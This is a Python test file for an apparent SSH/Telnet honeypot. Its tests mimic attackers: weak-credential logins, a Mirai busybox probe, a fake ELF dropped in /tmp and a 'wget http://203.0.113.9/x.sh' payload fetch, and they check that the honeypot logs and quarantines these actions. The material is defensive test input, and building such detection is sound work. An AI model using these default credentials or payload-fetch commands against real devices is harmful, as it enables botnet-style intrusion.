from __future__ import annotations

import asyncio

import asyncssh
import pytest

from conftest import read_events, running


async def _wait_for(settings, service, event, timeout=5.0, **match):
    end = asyncio.get_event_loop().time() + timeout
    while asyncio.get_event_loop().time() < end:
        for e in read_events(settings, service):
            if e["event"] == event and all(e["data"].get(k) == v for k, v in match.items()):
                return e
        await asyncio.sleep(0.1)
    raise AssertionError(f"event {event} {match} not seen; got {[e['event'] for e in read_events(settings, service)]}")


async def test_ssh_bruteforce_then_login_commands_and_capture(settings):
    async with running(settings, "ssh") as (svc, port):
        # wrong password is rejected and logged
        with pytest.raises(asyncssh.PermissionDenied):
            await asyncssh.connect("127.0.0.1", port, username="root", password="definitely-wrong-xyz",
                                   known_hosts=None, preferred_auth="password")
        # known weak creds succeed
        async with asyncssh.connect("127.0.0.1", port, username="root", password="admin", known_hosts=None) as conn:
            r = await conn.run("uname -a; id; echo -ne '\\x7fELF\\x02\\x01\\x01AAAAAAAAAAAAAAAA' > /tmp/m; chmod +x /tmp/m",
                               check=False)
            assert "Linux" in r.stdout and "uid=0(root)" in r.stdout
            # interactive shell
            proc = await conn.create_process(term_type="xterm")
            proc.stdin.write("whoami\n")
            proc.stdin.write("exit\n")
            out = await asyncio.wait_for(proc.stdout.read(), 10)
            assert "root" in out
    attempts = [e for e in read_events(settings, "ssh") if e["event"] == "auth.attempt"]
    assert [a["data"]["success"] for a in attempts][:2] == [False, True]
    assert attempts[0]["data"]["password"] == "definitely-wrong-xyz"
    ev = {e["event"] for e in read_events(settings, "ssh")}
    assert {"conn.open", "conn.close", "client.fingerprint", "session.open", "session.close", "cmd.input",
            "file.captured"} <= ev
    fp = next(e for e in read_events(settings, "ssh") if e["event"] == "client.fingerprint")
    assert fp["data"]["client_version"].startswith("SSH-2.0-AsyncSSH")
    assert len(fp["data"]["hassh"]) == 32
    # captured file landed in quarantine by hash
    cap = next(e for e in read_events(settings, "ssh") if e["event"] == "file.captured")
    assert (settings.quarantine_dir / cap["data"]["sha256"][:2] / cap["data"]["sha256"]).exists()


async def test_ssh_sftp_upload_is_quarantined(settings):
    async with running(settings, "ssh") as (svc, port):
        async with asyncssh.connect("127.0.0.1", port, username="root", password="root", known_hosts=None) as conn:
            async with conn.start_sftp_client() as sftp:
                async with sftp.open("/tmp/payload.bin", "wb") as f:
                    await f.write(b"\x7fELF" + b"A" * 100)
            await asyncio.sleep(0.2)
    e = await _wait_for(settings, "ssh", "file.captured", via="sftp-upload")
    assert e["data"]["size"] == 104 and e["data"]["origin"] == "upload"


async def test_ssh_too_many_failures_disconnects(settings):
    async with running(settings, "ssh") as (svc, port):
        with pytest.raises(asyncssh.Error):
            await asyncssh.connect("127.0.0.1", port, username="nobody", password="x", known_hosts=None)
    assert sum(1 for e in read_events(settings, "ssh") if e["event"] == "auth.attempt") >= 1


async def test_telnet_login_and_mirai_probe(settings):
    async with running(settings, "telnet") as (svc, port):
        reader, writer = await asyncio.open_connection("127.0.0.1", port)

        pending = bytearray()

        async def expect(token: bytes, timeout=5):
            while token not in pending:
                chunk = await asyncio.wait_for(reader.read(4096), timeout)
                if not chunk:
                    raise AssertionError(f"closed waiting for {token!r}: {bytes(pending)!r}")
                pending.extend(chunk)
            i = pending.index(token) + len(token)
            out = bytes(pending[:i])
            del pending[:i]
            return out

        await expect(b"login: ")
        writer.write(b"root\r\nbadpass-zzz\r\n")
        await expect(b"Login incorrect")
        await expect(b"login: ")
        writer.write(b"root\r\nxc3511\r\n")
        await expect(b"# ")
        writer.write(b"/bin/busybox MIRAI\r\n")
        out = await expect(b"applet not found")
        assert b"MIRAI" in out
        writer.write(b"cd /tmp; wget http://203.0.113.9/x.sh; exit\r\n")
        await asyncio.sleep(0.5)
        writer.close()
    evs = read_events(settings, "telnet")
    kinds = [e["event"] for e in evs]
    assert kinds.count("auth.attempt") == 2
    assert "download.attempt" in kinds and "session.close" in kinds
    assert any(e["event"] == "client.fingerprint" for e in evs)
